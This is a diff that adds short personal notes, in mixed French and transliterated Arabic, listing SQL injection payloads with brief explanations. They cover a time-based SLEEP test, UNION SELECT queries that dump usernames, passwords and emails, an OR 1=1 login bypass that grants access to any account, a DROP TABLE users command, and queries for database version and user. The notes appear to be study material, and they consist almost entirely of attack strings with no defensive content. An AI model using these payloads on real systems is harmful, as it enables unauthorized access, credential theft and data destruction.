@@ -1,0 +1,12 @@
+' OR SLEEP(5) -- user name   devient SELECT * FROM users WHERE username = '' OR SLEEP(5) Si l’application est vulnérable, le serveur met 5 secondes à répondre.
+
+Sinon, la requête est rejetée ou sécurisée → réponse immédiate.
+
+saf' UNION SELECT  username, password, email FROM users --   frl user name et ' OR "1=1" --  fel passswod  afiche toute la bd w tod5ol l ay compte
+
+' ; DROP TABLE users; --
+
+
+blindSqlInjection ' AND 1=1 -- 
+` UNION SELECT   user(), database(), version()` user actuel nom de data base version qui sron util pour destscter vilnerabilitis
+ devient SELECT password ,username ,email FROM users WHERE username = '' UNION SELECT user(), database(), version() --
